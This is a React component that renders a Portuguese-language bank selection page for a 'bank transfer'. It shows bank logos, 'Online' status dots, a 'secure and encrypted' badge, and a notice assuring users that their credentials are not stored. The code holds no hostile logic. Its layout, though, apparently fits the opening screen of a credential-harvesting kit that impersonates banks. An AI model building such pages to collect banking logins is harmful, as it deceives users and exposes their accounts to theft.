import React from 'react';
import { Bank } from '../types/bank';
import { Building2, ChevronRight } from 'lucide-react';

interface BankSelectorProps {
  banks: Bank[];
  onBankSelect: (bank: Bank) => void;
}

export const BankSelector: React.FC<BankSelectorProps> = ({ banks, onBankSelect }) => {
  return (
    <div className="max-w-5xl p-4 mx-auto">
      <div className="mb-8 text-center">
        <div className="flex items-center justify-center h-20 mx-auto mb-6 w-50 rounded-2xl">
          <img src="https://redmarketonpty.s3.eu-north-1.amazonaws.com/general/c731ed86-5cf4-47c6-abf4-d4467067ea36.webp" alt="" className="h-10 ml-2 text-white w-50" />
        </div>
        <h1 className="mb-3 font-bold text-transparent text-1xl bg-gradient-to-r from-gray-900 to-gray-700 bg-clip-text">
          Transferência Bancária
        </h1>
        <p className="max-w-2xl mx-auto text-sm text-gray-600">
          Selecione o seu banco para iniciar a transferência
        </p>
        <div className="inline-flex items-center px-4 py-2 mt-4 text-sm font-medium text-green-800 bg-green-100 rounded-full">
          <div className="w-2 h-2 mr-2 bg-green-500 rounded-full animate-pulse"></div>
          Sistema Seguro e Encriptado
        </div>
      </div>

      <div className="grid gap-6 md:grid-cols-2">
        {banks.map((bank) => (
          <button
            key={bank.id}
            onClick={() => onBankSelect(bank)}
            className="group relative overflow-hidden rounded-2xl border border-gray-200 bg-white p-4 shadow-lg transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] hover:-translate-y-1 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
            style={{
              '--bank-color': bank.primaryColor,
            } as React.CSSProperties}
          >
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <div 
                  className="flex items-center justify-center h-auto text-xl font-bold text-white w-50 rounded-xl"
                  style={{ backgroundColor: 'transparent' }}
                >
                  <img 
                    src={bank.icon} 
                    alt={`${bank.name} icon`}
                    className="w-20 h-auto rounded-lg"
                  />
                </div>
                <div className="text-left">
                  <h6 className="mb-1 text-xs font-bold text-gray-900 group-hover:text-gray-700">
                    {bank.name}
                  </h6>
                  <p className="mb-2 text-xs text-gray-500">
                    Internet Banking
                  </p>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                    <span className="text-xs font-medium text-green-600">Online</span>
                  </div>
                </div>
              </div>
              <div className="flex items-center space-x-3">
                <div className="text-right">
                  <p className="text-xs text-gray-500">Transferência</p>
                  <p className="text-xs font-semibold text-gray-700">Instantânea</p>
                </div>
                <ChevronRight 
                  className="w-6 h-6 text-gray-400 transition-all duration-300 group-hover:text-gray-600 group-hover:translate-x-1"
                  style={{ color: bank.primaryColor }}
                />
              </div>
            </div>
            
            {/* Subtle gradient overlay on hover */}
            <div 
              className="absolute inset-0 transition-opacity duration-300 opacity-0 group-hover:opacity-5"
              style={{ backgroundColor: bank.primaryColor }}
            />
            
            {/* Animated border */}
            <div 
              className="absolute inset-0 transition-opacity duration-300 opacity-0 rounded-2xl group-hover:opacity-100"
              style={{ 
                background: `linear-gradient(45deg, ${bank.primaryColor}20, transparent, ${bank.primaryColor}20)`,
                padding: '2px'
              }}
            />
          </button>
        ))}
      </div>

      <div className="p-6 mt-12 border border-red bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl">
        <div className="flex items-start space-x-3"> 
          <div className="text-gray-500">
            <p className="mb-2 text-sm font-semibold">Informação de Segurança</p>
            <p className="text-sm leading-relaxed">
              As suas credenciais são tratadas com elevados padrões de segurança.<br />
              Não são armazenadas permanentemente e todas as comunicações são encriptadas e protegidas, garantindo total confidencialidade.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};